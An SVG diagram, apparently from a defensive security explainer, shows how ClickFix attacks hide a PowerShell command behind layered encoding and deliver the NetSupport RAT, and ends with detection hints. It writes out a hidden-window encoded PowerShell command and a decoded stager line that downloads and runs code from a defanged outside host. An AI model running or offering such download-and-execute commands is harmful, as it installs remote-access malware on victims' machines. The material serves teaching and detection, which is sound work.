<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 480" width="100%" style="max-width: 800px; height: auto;" role="img" aria-label="ClickFix obfuscation stack — how an attacker hides a malicious command behind layered encoding so the victim sees gibberish but the shell decodes it on paste">
  <style>
    .layer-a   { fill: #533483; fill-opacity: 0.12; stroke: #533483; stroke-width: 1.5; rx: 8; }
    .layer-b   { fill: #0f3460; fill-opacity: 0.14; stroke: #0f3460; stroke-width: 1.5; rx: 8; }
    .layer-c   { fill: #fb923c; fill-opacity: 0.16; stroke: #fb923c; stroke-width: 1.5; rx: 8; }
    .layer-d   { fill: #e94560; fill-opacity: 0.18; stroke: #e94560; stroke-width: 1.8; rx: 8; }
    .terminal  { fill: #16213e; fill-opacity: 0.35; stroke: currentColor; stroke-opacity: 0.4; stroke-width: 1.5; rx: 8; }
    .title     { font: 600 16px ui-sans-serif, system-ui, sans-serif; fill: currentColor; }
    .subtitle  { font: 12px ui-sans-serif, system-ui, sans-serif; fill: currentColor; fill-opacity: 0.6; }
    .layer-lbl { font: 600 12.5px ui-sans-serif, system-ui, sans-serif; fill: currentColor; }
    .pill      { font: 600 10px ui-sans-serif, system-ui, sans-serif; fill: currentColor; fill-opacity: 0.55; text-transform: uppercase; letter-spacing: 0.06em; }
    .mono      { font: 11px ui-monospace, SFMono-Regular, Menlo, monospace; fill: currentColor; }
    .annot     { font: 11px ui-sans-serif, system-ui, sans-serif; fill: currentColor; fill-opacity: 0.7; }
    .arrow     { stroke: currentColor; stroke-opacity: 0.4; stroke-width: 1.5; fill: none; }
    .term-text   { font: 11px ui-monospace, SFMono-Regular, Menlo, monospace; fill: #d1fae5; }
    .term-prompt { font: 600 11px ui-monospace, SFMono-Regular, Menlo, monospace; fill: #fb923c; }
  </style>

  <text x="20" y="28" class="title">Obfuscation stack — what the victim sees vs. what runs</text>
  <text x="20" y="50" class="subtitle">Most ClickFix payloads stack three to four encoding layers.</text>
  <text x="20" y="66" class="subtitle">The visible command is gibberish; PowerShell or zsh decodes the layers in sequence at runtime.</text>

  <defs>
    <marker id="downarr" viewBox="0 0 10 10" refX="5" refY="9" markerWidth="6" markerHeight="6" orient="auto">
      <path d="M 0 0 L 5 9 L 10 0 z" fill="currentColor" fill-opacity="0.4"/>
    </marker>
  </defs>

  <!-- Layer 1: Visible string -->
  <rect class="layer-a" x="20" y="90" width="500" height="64"/>
  <text x="36" y="110" class="pill">Layer 1 — what the victim pastes</text>
  <text x="36" y="134" class="mono">powershell -nop -w hidden -enc JABzAGUAcgB2AGU…</text>
  <text x="540" y="119" class="layer-lbl">Visible</text>
  <text x="540" y="137" class="annot">Gibberish to humans.</text>
  <text x="540" y="151" class="annot">PowerShell flag tips off some EDR.</text>

  <path class="arrow" d="M 270 156 L 270 172" marker-end="url(#downarr)"/>

  <!-- Layer 2: Base64 decoded -->
  <rect class="layer-b" x="20" y="174" width="500" height="64"/>
  <text x="36" y="194" class="pill">Layer 2 — after -enc base64 decode</text>
  <text x="36" y="218" class="mono">$srv='http://nobovcs[.]com/bibi.php';</text>
  <text x="36" y="232" class="mono">iex(New-Object Net.WebClient).DownloadString($srv)</text>
  <text x="540" y="203" class="layer-lbl">Decoded</text>
  <text x="540" y="221" class="annot">Now PowerShell can see it.</text>
  <text x="540" y="235" class="annot">iex + DownloadString = stager.</text>

  <path class="arrow" d="M 270 240 L 270 256" marker-end="url(#downarr)"/>

  <!-- Layer 3: Downloaded stager -->
  <rect class="layer-c" x="20" y="258" width="500" height="64"/>
  <text x="36" y="278" class="pill">Layer 3 — second-stage script fetched at runtime</text>
  <text x="36" y="302" class="mono">function Install-RAT {</text>
  <text x="36" y="316" class="mono">  Invoke-WebRequest … -OutFile $env:TEMP\sup.exe</text>
  <text x="540" y="287" class="layer-lbl">Stager</text>
  <text x="540" y="305" class="annot">Lives only in memory.</text>
  <text x="540" y="319" class="annot">Few on-disk artefacts.</text>

  <path class="arrow" d="M 270 324 L 270 340" marker-end="url(#downarr)"/>

  <!-- Layer 4: Final payload -->
  <rect class="layer-d" x="20" y="342" width="500" height="64"/>
  <text x="36" y="362" class="pill">Layer 4 — payload</text>
  <text x="36" y="386" class="mono">NetSupport RAT → %LOCALAPPDATA%\&lt;rand&gt;\client32.exe</text>
  <text x="540" y="371" class="layer-lbl">Outcome</text>
  <text x="540" y="389" class="annot">Cred theft, persistence,</text>
  <text x="540" y="403" class="annot">remote control.</text>

  <!-- Detection callout terminal — two lines so nothing overflows -->
  <rect class="terminal" x="20" y="420" width="760" height="48"/>
  <text x="36" y="440" class="term-prompt">DETECTION</text>
  <text x="118" y="440" class="term-text">Catch layer 1 with powershell_events cosine_similarity &lt; 0.25 (anomaly).</text>
  <text x="118" y="458" class="term-text">Catch layer 2 with windows_events 4104 + script_text LIKE patterns.</text>
</svg>
